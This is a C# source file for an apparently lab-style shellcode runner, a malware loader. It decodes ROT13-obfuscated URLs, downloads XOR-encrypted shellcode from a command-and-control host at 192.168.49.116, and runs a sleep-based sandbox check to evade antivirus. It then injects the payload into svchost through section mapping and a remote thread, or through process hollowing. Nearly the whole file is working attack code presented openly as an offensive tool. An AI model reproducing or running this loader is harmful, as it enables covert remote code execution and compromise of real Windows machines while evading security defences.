using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

public class ShellcodeRunner
{
    private static WebClient wc = null;

    private static string Decrypt(string enc)
    {
        string alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        string ralph = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm";

        char[] dec = enc.ToCharArray();
        for (int i = 0; i < dec.Length; i++)
        {
            try { dec[i] = ralph[alph.IndexOf(dec[i])]; }
            catch { }
        }
        return new string(dec);
    }

    private static bool DetectAV()
    {
        DateTime now = DateTime.Now;
        Utility.Sleep(2000);
        return (DateTime.Now.Subtract(now).TotalSeconds < 1.5);
    }

    private static WebClient GetWebClient(string address)
    {
        if (wc != null)
            return wc;

        Uri uri = new Uri(address);
        string baseUri = String.Format("{0}://{1}:{2}/", uri.Scheme, uri.Host, uri.Port);

        wc = new WebClient();
        try
        {
            // Attempt direct access to C2 server
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
            wc.Proxy = null;
            wc.DownloadString(baseUri);
        }
        catch
        {
            try
            {
                // Enable automatic proxy when callback to the C2 server fails
                wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
                wc.DownloadString(baseUri);
            }
            catch
            {
                // When running in SYSTEM integrity level, detect proxy settings manually
                string sid = "";
                foreach (string name in Registry.Users.GetSubKeyNames())
                    if (name.Contains("S-1-5-21-"))
                    {
                        sid = name;
                        break;
                    }

                string subKey = sid + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\";
                string proxyAddr = (string)Registry.Users.OpenSubKey(subKey, false).GetValue("ProxyServer");
                wc.Proxy = new WebProxy(String.Format("{0}://{1}", uri.Scheme, proxyAddr));
            }
        }

        return wc;
    }

    private static byte[] LoadShellcode(string address)
    {
        // Download shellcode from C2
        byte[] shellcode = GetWebClient(address).DownloadData(address);

        // Decode and decrypt shellcode
        shellcode = Convert.FromBase64String(Encoding.Default.GetString(shellcode));
        for (int i = 0; i < shellcode.Length; i++)
            shellcode[i] = (byte)((uint)shellcode[i] ^ 0xFF);

        return shellcode;
    }

    private static Process GetProcess(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        for (int i = 0; i < processes.Length; i++)
        {
            try
            {
                if (processes[i].PriorityClass.ToString() == "Normal")
                    return processes[i];
            }
            catch { }
        }
        return null;
    }

    private static void ProcessInjection(Process process, byte[] shellcode)
    {
        // Create handle for a section in shared memory
        IntPtr sHandle = IntPtr.Zero;
        UInt32 size = (UInt32)shellcode.Length;
        Utility.NtCreateSection(ref sHandle, 0x000F001F, IntPtr.Zero, ref size, 0x40, 0x8000000, IntPtr.Zero);

        // Create a mapping of a view for the created section in the current process
        IntPtr local_addr = IntPtr.Zero;
        ulong offset = (ulong)0;
        Utility.NtMapViewOfSection(sHandle, Utility.GetCurrentProcess(), ref local_addr, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, 0x2, 0x0, 0x40);

        // Copy loaded shellcode into the section via mapped view
        Marshal.Copy(shellcode, 0, local_addr, shellcode.Length);

        // Unmap view in the current process
        Utility.NtUnmapViewOfSection(Utility.GetCurrentProcess(), local_addr);

        // Create a mapping of a view for the created section in the remote process
        IntPtr pHandle = Utility.OpenProcess(0x001F0FFF, false, process.Id);
        IntPtr remote_addr = IntPtr.Zero;
        Utility.NtMapViewOfSection(sHandle, pHandle, ref remote_addr, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, 0x2, 0x0, 0x40);

        // Remove created section handle
        Utility.NtClose(sHandle);

        // Create a remote thread from the shellcode in the mapped view in the remote process
        Utility.CreateRemoteThread(pHandle, IntPtr.Zero, 0, remote_addr, IntPtr.Zero, 0, IntPtr.Zero);

        /*
        // Currently, when shellcode exits, the main thread dies along with it
        // When a thread gets terminated, it is impossible to re-enable the thread
        // This makes it a one-time exploit per process
        // Need to find a way to revert the thread back to its normal state after exploit
        // Reference : https://www.ownedcore.com/forums/world-of-warcraft/world-of-warcraft-bots-programs/wow-memory-editing/422715-c-asm-injection-setthreadcontext.html
        // Open handle for main thread of the remote process
        IntPtr tHandle = Utility.OpenThread(0x1A, false, (uint)process.Threads[0].Id);

        // Suspend main thread of the remote process
        Utility.SuspendThread(tHandle);

        // Get context of the main thread
        Utility.CONTEXT64 context = new Utility.CONTEXT64();
        context.ContextFlags = Utility.CONTEXT_FLAGS.CONTEXT_ALL;
        Utility.GetThreadContext(tHandle, ref context);

        // Set RIP to the address of mapped view where shellcode resides
        context.Rip = (ulong)remote_addr;
        Utility.SetThreadContext(tHandle, ref context);

        // Resume suspended thread to execute shellcode
        while (Utility.ResumeThread(tHandle) != 0) ;

        // Close handle for remote thread
        Utility.CloseHandle(tHandle);
        */
    }

    private static void ProcessHollowing(string filename, byte[] shellcode)
    {
        // Create process svchost.exe
        Utility.STARTUPINFO si = new Utility.STARTUPINFO();
        Utility.PROCESS_INFORMATION pi = new Utility.PROCESS_INFORMATION();
        Utility.CreateProcess(null, filename, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        // Retrieve information on the created process
        Utility.PROCESS_BASIC_INFORMATION bi = new Utility.PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        Utility.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        // Retrieve base address of the executable
        IntPtr ptrToImageBase = (IntPtr)(bi.PebAddress.ToInt64() + (IntPtr.Size == 4 ? 0x08 : 0x10));
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        Utility.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, ref nRead);

        // Retrieve address of the PE header
        IntPtr svchostBase;
        if (IntPtr.Size == 4)
            svchostBase = (IntPtr)BitConverter.ToInt32(addrBuf, 0);
        else
            svchostBase = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
        byte[] data = new byte[0x200];
        Utility.ReadProcessMemory(hProcess, svchostBase, data, data.Length, ref nRead);

        // Retrieve address of the entry point
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = (uint)(e_lfanew_offset + 0x28);
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(svchostBase.ToInt64() + entrypoint_rva);

        // Write shellcode to the entry point
        Utility.WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, ref nRead);

        // Resume thread to execute shellcode
        Utility.ResumeThread(pi.hThread);
    }

    public static void RunShellcode()
    {
        if (DetectAV())
            return;

        byte[] shellcode32 = LoadShellcode(Decrypt("uggc://192.168.49.116/furyypbqr32.ova.rap"));
        byte[] shellcode64 = LoadShellcode(Decrypt("uggc://192.168.49.116/furyypbqr64.ova.rap"));

        // svchost
        string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(Decrypt("p3MwnT9mqN==")));
        Process process = GetProcess(processName);

        if (IntPtr.Size == 8 && process != null)
            ProcessInjection(process, shellcode64);
        else
        {
            // C:\Windows\SysWOW64\svchost.exe, C:\Windows\System32\svchost.exe
            string b64_filename = IntPtr.Size == 4 ? Decrypt("DmcpI2yhMT93p1kGrKAKG1p2ASkmqzAbo3A0YzI4MD==") : Decrypt("DmcpI2yhMT93p1kGrKA0MJ0mZykmqzAbo3A0YzI4MD==");
            string filename = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64_filename));
            ProcessHollowing(filename, IntPtr.Size == 4 ? shellcode32 : shellcode64);
        }
    }
}
